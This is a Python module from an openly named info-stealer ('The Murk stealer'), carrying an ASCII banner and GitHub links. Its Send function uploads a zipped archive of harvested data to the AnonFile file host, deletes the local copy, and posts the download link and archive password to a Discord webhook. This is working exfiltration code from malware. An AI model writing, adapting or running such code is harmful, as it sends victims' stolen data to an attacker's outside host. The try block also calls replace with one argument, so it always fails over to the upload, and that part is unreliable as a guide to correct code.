#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from discord_webhook import DiscordWebhook, DiscordEmbed
from anonfile import AnonFile
import os


def Send(urlWebHook,botName,np):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		file = AnonFile()
		upload = file.upload(rf'{np[0]}.zip')
		try:
			os.remove(f'{np[0]}.zip')
			pass
		except Exception as e:
			print(e)
		url = upload.url.geturl()
		print(url)
		massage = f'Link: {url}\nPassword: {np[1]}\n@everyone'
		hook = DiscordWebhook(url=urlWebHook, username=botName,content='**The Murk results**')
		embed =DiscordEmbed(title=massage, color = 242424)
		hook.add_embed(embed)
		response = hook.execute()